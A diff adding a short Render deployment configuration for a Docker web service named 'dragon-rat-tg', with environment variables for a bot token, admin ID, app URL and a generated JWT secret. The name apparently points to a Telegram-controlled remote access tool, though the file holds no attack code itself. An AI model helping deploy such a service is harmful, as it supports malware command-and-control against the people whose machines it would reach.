@@ -1,0 +1,17 @@
+services:
+  - type: web
+    name: dragon-rat-tg
+    env: docker
+    repo: https://github.com/yourusername/DragonRAT-TG
+    plan: free
+    region: ohio
+    healthCheckPath: /health
+    envVars:
+      - key: BOT_TOKEN
+        sync: false
+      - key: ADMIN_ID
+        sync: false
+      - key: APP_URL
+        value: https://dragon-rat-tg.onrender.com
+      - key: JWT_SECRET
+        generateValue: true
